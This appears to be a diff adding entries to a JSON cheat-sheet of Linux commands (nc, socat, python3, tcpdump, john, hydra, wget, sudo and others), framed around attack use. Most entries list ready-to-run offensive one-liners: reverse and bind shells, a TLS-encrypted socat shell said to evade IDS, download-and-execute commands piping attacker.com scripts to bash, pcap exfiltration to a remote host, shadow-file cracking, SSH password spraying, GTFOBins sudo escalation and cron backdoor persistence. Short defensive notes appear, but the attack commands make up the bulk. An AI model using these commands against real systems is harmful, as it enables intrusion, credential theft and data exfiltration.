+      "quick_use": [
+        "nc -lvnp 4444                              # listen for reverse shell",
+        "nc 10.0.0.1 4444 -e /bin/bash             # bind shell (GNU netcat)",
+        "nc -zv 10.0.0.1 1-1000 2>&1 | grep open  # port scan range",
+        "nc -w3 10.0.0.1 80                        # test port connectivity",
+        "nc -lvnp 9001 > received_file             # receive a file"
+      ],
+      "combinations": [
+        {
+          "with": "mkfifo",
+          "example": "mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f | /bin/bash >/tmp/.f 2>&1",
+          "note": "Named-pipe reverse shell — works on any netcat"
+        },
+        {
+          "with": "base64",
+          "example": "nc -lvnp 9001 | base64 -d > payload.bin",
+          "note": "Receive base64-encoded binary payload"
+        },
+        {
+          "with": "nmap",
+          "example": "nmap -p- --open 10.0.0.1 -oG - | awk '/open/{print $2}' | while read ip; do nc -zv $ip 80 2>&1; done",
+          "note": "Verify nmap findings with netcat"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2014-6271 (Shellshock PoCs universally use nc for callback)"
+      ],
+      "ctf_categories": [
+        "pwn",
+        "network",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Can bind to privileged ports (<1024): `nc -lvp 80` — impersonate HTTP on standard port",
+        "user": "Listener restricted to ports >= 1024; all client connections and reverse shells work without root"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_socat",
+      "title": "The 'socat' Command In Linux",
+      "command": "socat",
+      "hat": "black",
+      "security_intent": "Advanced relay tool — netcat with TLS, full duplex, and bidirectional stream support. Preferred over nc for encrypted reverse shells and complex port forwarding chains in mature attack toolchains.",
+      "attack_vectors": [
+        "encrypted reverse shell (TLS)",
+        "full-duplex port relay",
+        "SOCKS proxy creation",
+        "bind shell with PTY"
+      ],
+      "defense_use": "Debugging complex network services, TLS-wrapped connections, creating SSL tunnels.",
+      "mitre_tags": [
+        "T1059.004",
+        "T1572",
+        "T1071.001"
+      ],
+      "threat_level": 5,
+      "related_commands": [
+        "nc",
+        "openssl",
+        "mkfifo",
+        "ssh"
+      ],
+      "quick_use": [
+        "socat TCP-LISTEN:4444,fork EXEC:/bin/bash  # bind shell with fork",
+        "socat TCP:10.0.0.1:4444 EXEC:'/bin/bash',pty,stderr,setsid  # PTY reverse shell",
+        "socat OPENSSL-LISTEN:4443,cert=c.pem,key=k.pem,verify=0,fork EXEC:/bin/bash",
+        "socat TCP-LISTEN:8080,fork TCP:internal.host:80  # port forward relay",
+        "socat -d -d TCP-LISTEN:1234 STDOUT         # debug incoming connections"
+      ],
+      "combinations": [
+        {
+          "with": "openssl",
+          "example": "# Attacker: openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -out c.pem\nsocat OPENSSL-LISTEN:4443,cert=c.pem,key=k.pem,verify=0 -\n# Victim: socat OPENSSL:attacker:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid",
+          "note": "Fully encrypted reverse PTY shell — bypasses most DPI/IDS"
+        },
+        {
+          "with": "nc",
+          "example": "socat TCP-LISTEN:8080,fork TCP:10.0.0.1:80 &  # relay, then: nc 127.0.0.1 8080",
+          "note": "Use socat as transparent relay; interact via nc"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "pwn",
+        "network",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Can create listeners on any port; bind to privileged ports for HTTPS impersonation",
+        "user": "Full functionality for reverse shells and relays; listener ports >= 1024 only"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_python3",
+      "title": "The 'python3' Command In Linux",
+      "command": "python3",
+      "hat": "red",
+      "security_intent": "The pentest scripting language. Used for rapid exploit development, HTTP servers for payload delivery, custom encoders/decoders, privilege escalation via sudo misconfiguration, and as a GTFOBins shell when in sudoers.",
+      "attack_vectors": [
+        "GTFOBins shell via sudo python3",
+        "HTTP payload delivery server",
+        "exploit scripting",
+        "crypto bypass scripting",
+        "pickle deserialization RCE"
+      ],
+      "defense_use": "Security automation, log parsing, custom detection scripts, incident response tooling.",
+      "mitre_tags": [
+        "T1059.006",
+        "T1105",
+        "T1548.003"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "nc",
+        "curl",
+        "base64",
+        "openssl"
+      ],
+      "quick_use": [
+        "python3 -m http.server 8080               # instant file server for payload delivery",
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'  # upgrade reverse shell TTY",
+        "python3 -c 'import os; os.system(\"/bin/bash\")'   # GTFOBins if sudo-permitted",
+        "python3 -c 'import socket,subprocess,os; s=socket.socket()...'  # inline reverse shell",
+        "python3 -c 'print(__import__(\"base64\").b64decode(\"BASE64\").decode())'  # decode payload"
+      ],
+      "combinations": [
+        {
+          "with": "nc",
+          "example": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+          "note": "Python reverse shell — no mkfifo required"
+        },
+        {
+          "with": "curl",
+          "example": "python3 -m http.server 8080 &  # then on target: curl http://attacker:8080/payload.sh | bash",
+          "note": "Serve and execute payload in one step"
+        },
+        {
+          "with": "base64",
+          "example": "python3 -c \"exec(__import__('base64').b64decode('PAYLOAD'))\"",
+          "note": "Execute base64-encoded Python payload inline"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2023-27043 (email parsing bypass)",
+        "CVE-2022-45061 (slow regex DoS)"
+      ],
+      "ctf_categories": [
+        "pwn",
+        "crypto",
+        "web",
+        "scripting"
+      ],
+      "root_vs_user": {
+        "root": "Scripts run as root — `python3 -c 'import os; os.setuid(0)'` works; writes anywhere",
+        "user": "`sudo python3` is a classic misconfiguration; GTFOBins: `sudo python3 -c 'import os; os.system(\"/bin/bash\")'`"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_tcpdump",
+      "title": "The 'tcpdump' Command In Linux",
+      "command": "tcpdump",
+      "hat": "red",
+      "security_intent": "CLI packet capture tool. Captures cleartext credentials, session tokens, and DNS queries on the wire. On a compromised internal host, tcpdump running briefly on the network interface can harvest credentials from adjacent hosts.",
+      "attack_vectors": [
+        "credential capture on LAN",
+        "session token theft",
+        "protocol analysis",
+        "DNS query logging",
+        "network traffic exfiltration"
+      ],
+      "defense_use": "Network baseline capture, intrusion detection, protocol debugging, bandwidth analysis.",
+      "mitre_tags": [
+        "T1040",
+        "T1557.002",
+        "T1020"
+      ],
+      "threat_level": 4,
+      "related_commands": [
+        "nc",
+        "grep",
+        "awk",
+        "openssl"
+      ],
+      "quick_use": [
+        "tcpdump -i eth0 -w capture.pcap           # write full capture to file",
+        "tcpdump -i any port 80 -A                 # show HTTP traffic in ASCII",
+        "tcpdump -i eth0 'tcp port 21 or port 110' -A  # FTP + POP3 credentials",
+        "tcpdump -i eth0 host 10.0.0.1             # capture traffic to/from host",
+        "tcpdump -r capture.pcap -A | grep -i 'pass\\|user'  # post-process for creds"
+      ],
+      "combinations": [
+        {
+          "with": "grep",
+          "example": "tcpdump -i eth0 port 80 -A -l | grep -oE '(GET|POST) [^ ]*|Host: [^ ]*|Cookie: [^ ]*'",
+          "note": "Live HTTP URL and cookie extraction"
+        },
+        {
+          "with": "awk",
+          "example": "tcpdump -i eth0 -l -n | awk '/DNS/{print $NF}'",
+          "note": "Live DNS query logging"
+        },
+        {
+          "with": "nc",
+          "example": "tcpdump -i eth0 -w - | nc 10.0.0.1 9001",
+          "note": "Stream live pcap to remote attacker machine"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "network",
+        "forensics"
+      ],
+      "root_vs_user": {
+        "root": "Full capture on any interface including promiscuous mode; no restrictions",
+        "user": "Requires CAP_NET_RAW or membership in pcap group — typically blocked by default"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_john",
+      "title": "The 'john' Command In Linux",
+      "command": "john",
+      "hat": "black",
+      "security_intent": "John the Ripper — offline password cracker. Supports hundreds of hash types: Unix shadow, NTLM, MD5, bcrypt, Kerberos tickets. Core post-exploitation tool after obtaining /etc/shadow or an NTLM hash dump.",
+      "attack_vectors": [
+        "shadow file cracking",
+        "NTLM hash cracking",
+        "dictionary + rule attack",
+        "Kerberoasting",
+        "zip/SSH key cracking"
+      ],
+      "defense_use": "Proactive password auditing — detect weak passwords before attackers do.",
+      "mitre_tags": [
+        "T1110.002",
+        "T1558.003",
+        "T1552.001"
+      ],
+      "threat_level": 4,
+      "related_commands": [
+        "dd",
+        "grep",
+        "awk",
+        "ssh"
+      ],
+      "quick_use": [
+        "john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
+        "john --format=NT hashes.txt --wordlist=rockyou.txt  # NTLM hashes",
+        "john --show shadow.txt                    # display cracked passwords",
+        "john --rules --wordlist=rockyou.txt shadow.txt  # with mangling rules",
+        "zip2john archive.zip > zip.hash && john zip.hash  # crack zip password"
+      ],
+      "combinations": [
+        {
+          "with": "dd",
+          "example": "dd if=/dev/sda | grep -a 'NTLM' | tee ntlm.raw  # extract hashes from raw image",
+          "note": "Disk forensics → hash extraction → cracking pipeline"
+        },
+        {
+          "with": "awk",
+          "example": "awk -F: '{print $1\":\"$2}' /etc/shadow | john --stdin --format=crypt",
+          "note": "Pipe shadow directly to john"
+        },
+        {
+          "with": "ssh",
+          "example": "ssh2john ~/.ssh/id_rsa > rsa.hash && john rsa.hash --wordlist=rockyou.txt",
+          "note": "Crack passphrase-protected private key"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Can read /etc/shadow directly — no need to first obtain it via exploit",
+        "user": "Needs shadow already exfiltrated; cracking itself requires no privileges"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_hydra",
+      "title": "The 'hydra' Command In Linux",
+      "command": "hydra",
+      "hat": "black",
+      "security_intent": "Network brute-force tool. Supports 50+ protocols: SSH, FTP, HTTP forms, RDP, SMTP, databases. Used for credential stuffing, password spraying, and service brute-force in penetration tests.",
+      "attack_vectors": [
+        "SSH brute force",
+        "HTTP form credential stuffing",
+        "FTP/SMTP brute force",
+        "RDP password spray",
+        "database authentication brute force"
+      ],
+      "defense_use": "Testing account lockout policies, validating rate limiting, identifying weak service credentials.",
+      "mitre_tags": [
+        "T1110.001",
+        "T1110.003",
+        "T1078"
+      ],
+      "threat_level": 5,
+      "related_commands": [
+        "nmap",
+        "ssh",
+        "curl",
+        "nc"
+      ],
+      "quick_use": [
+        "hydra -l admin -P rockyou.txt ssh://10.0.0.1  # SSH brute force",
+        "hydra -L users.txt -P passwords.txt ftp://10.0.0.1",
+        "hydra -l admin -P rockyou.txt 10.0.0.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
+        "hydra -L users.txt -p 'Summer2024!' ssh://10.0.0.0/24  # password spray subnet",
+        "hydra -l root -P rockyou.txt mysql://10.0.0.1"
+      ],
+      "combinations": [
+        {
+          "with": "nmap",
+          "example": "nmap -p 22 --open 10.0.0.0/24 -oG - | awk '/open/{print $2}' > ssh_hosts.txt && hydra -L users.txt -P rockyou.txt -M ssh_hosts.txt ssh",
+          "note": "Auto-discover SSH hosts then brute force all of them"
+        },
+        {
+          "with": "curl",
+          "example": "# First: use curl to identify login form params\ncurl -si http://target.com/login | grep 'name='\n# Then: hydra -l admin -P rockyou.txt target.com http-post-form '/login:...'",
+          "note": "Recon form params with curl before hydra"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "web",
+        "network",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "No functional difference for network attacks; can use more source ports and raw sockets",
+        "user": "Full functionality for all supported protocols; no root needed"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_strace",
+      "title": "The 'strace' Command In Linux",
+      "command": "strace",
+      "hat": "red",
+      "security_intent": "System call tracer. Reveals exactly what a program does at the kernel boundary: file opens, network connections, exec calls, memory operations. Attackers use it to extract hardcoded credentials passed as arguments, discover hidden config files, and reverse engineer binary behavior.",
+      "attack_vectors": [
+        "credential extraction from process arguments",
+        "config file path discovery",
+        "binary behavior analysis",
+        "anti-debug detection bypass"
+      ],
+      "defense_use": "Debugging unexpected program behavior, incident response analysis of suspicious processes, malware behavior analysis.",
+      "mitre_tags": [
+        "T1057",
+        "T1059.004",
+        "T1552.004"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "ps",
+        "lsof",
+        "find",
+        "grep"
+      ],
+      "quick_use": [
+        "strace -p PID                             # attach to running process",
+        "strace -e openat,read,write -p PID        # trace only file operations",
+        "strace -e execve command 2>&1 | grep exec # trace child process spawning",
+        "strace -s 9999 -e read,write ./binary 2>&1 | grep -A2 'read('  # dump I/O",
+        "strace -f -e network ./binary 2>&1        # trace network syscalls + forks"
+      ],
+      "combinations": [
+        {
+          "with": "grep",
+          "example": "strace -e openat ./suspicious_binary 2>&1 | grep -v ENOENT | grep '\"/'",
+          "note": "List all files the binary successfully opens"
+        },
+        {
+          "with": "awk",
+          "example": "strace -c ./binary 2>&1 | awk 'NR>2{print $NF, $1}' | sort -rn | head",
+          "note": "Profile which syscalls take the most time"
+        },
+        {
+          "with": "ps",
+          "example": "ps aux | grep target_process | awk '{print $2}' | xargs strace -p",
+          "note": "Auto-attach strace to a named process"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "pwn",
+        "reversing"
+      ],
+      "root_vs_user": {
+        "root": "Can trace any process including system daemons; no ptrace_scope restrictions",
+        "user": "Restricted by /proc/sys/kernel/yama/ptrace_scope; default on many distros blocks tracing other users' processes"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_wget",
+      "title": "The 'wget' Command In Linux",
+      "command": "wget",
+      "hat": "red",
+      "security_intent": "File retrieval tool with recursive crawling and mirror capability. Attackers use it to download payloads from C2 servers, spider internal web apps, and transfer exfiltrated data. `wget` is often present where `curl` is not.",
+      "attack_vectors": [
+        "payload delivery from C2",
+        "internal web app spidering",
+        "credential exposure via basic-auth URL",
+        "recursive download for data exfil"
+      ],
+      "defense_use": "Downloading security patches, mirroring documentation, fetching threat intelligence feeds.",
+      "mitre_tags": [
+        "T1105",
+        "T1071.001",
+        "T1567"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "curl",
+        "nc",
+        "python3"
+      ],
+      "quick_use": [
+        "wget -q http://10.0.0.1:8080/payload.sh -O- | bash  # download and execute",
+        "wget -r -np -k http://internal.corp/         # mirror entire site",
+        "wget --no-check-certificate https://10.0.0.1/file  # skip TLS verification",
+        "wget -P /tmp http://10.0.0.1:8080/shell.elf  # save payload to /tmp",
+        "wget -q -O- http://169.254.169.254/latest/meta-data/  # AWS IMDS SSRF"
+      ],
+      "combinations": [
+        {
+          "with": "bash",
+          "example": "wget -qO- http://attacker.com/rev.sh | bash",
+          "note": "One-liner fileless payload execution"
+        },
+        {
+          "with": "python3",
+          "example": "python3 -m http.server 8080 & wget http://localhost:8080/test  # test delivery",
+          "note": "Verify payload delivery chain locally"
+        },
+        {
+          "with": "nc",
+          "example": "wget -q http://attacker.com/payload && nc attacker.com 4444 < payload",
+          "note": "Download then exfil via nc"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2021-31879 (wget cookie injection via redirect)",
+        "CVE-2019-5953 (stack overflow in wget)"
+      ],
+      "ctf_categories": [
+        "web",
+        "network"
+      ],
+      "root_vs_user": {
+        "root": "Can write anywhere; `wget -O /etc/cron.d/backdoor http://...` for persistence",
+        "user": "Writes to user-writable paths; still fully functional for payload delivery"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_sudo",
+      "title": "The 'sudo' Command In Linux",
+      "command": "sudo",
+      "hat": "black",
+      "security_intent": "Privilege delegation tool that is simultaneously the most common Linux privilege escalation vector. Misconfigured sudoers entries (NOPASSWD, wildcards, GTFOBins-eligible commands) give attackers immediate root. `sudo -l` is always the first post-access command.",
+      "attack_vectors": [
+        "sudo -l privilege enumeration",
+        "GTFOBins sudo escalation",
+        "wildcard injection in sudo commands",
+        "LD_PRELOAD environment variable abuse",
+        "CVE-2021-3156 Baron Samedit heap overflow"
+      ],
+      "defense_use": "Controlled privilege delegation, audit trail of elevated commands via syslog.",
+      "mitre_tags": [
+        "T1548.003",
+        "T1069.001",
+        "T1078.003"
+      ],
+      "threat_level": 5,
+      "related_commands": [
+        "find",
+        "python3",
+        "awk",
+        "vi"
+      ],
+      "quick_use": [
+        "sudo -l                                   # list allowed commands — always run first",
+        "sudo -u victim command                    # run as another user",
+        "sudo bash                                 # root shell if sudo bash is allowed",
+        "sudo find / -exec /bin/bash \\;           # GTFOBins via find",
+        "sudo awk 'BEGIN{system(\"/bin/bash\")}'    # GTFOBins via awk"
+      ],
+      "combinations": [
+        {
+          "with": "find",
+          "example": "sudo find / -exec /bin/bash -ip \\;",
+          "note": "Escalate to root shell via sudo find — GTFOBins classic"
+        },
+        {
+          "with": "python3",
+          "example": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
+          "note": "Instant root if python3 in sudoers"
+        },
+        {
+          "with": "awk",
+          "example": "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
+          "note": "GTFOBins awk shell escape"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2021-3156 (Baron Samedit — heap overflow RCE)",
+        "CVE-2021-3560 (authentication bypass)",
+        "CVE-2019-14287 (sudo -u#-1 bypass)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Full sudo functionality; can configure sudoers; can sudo as any user",
+        "user": "`sudo -l` reveals the attack surface; single misconfigured entry gives root"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
     }
   ],
   "attack_chains": [
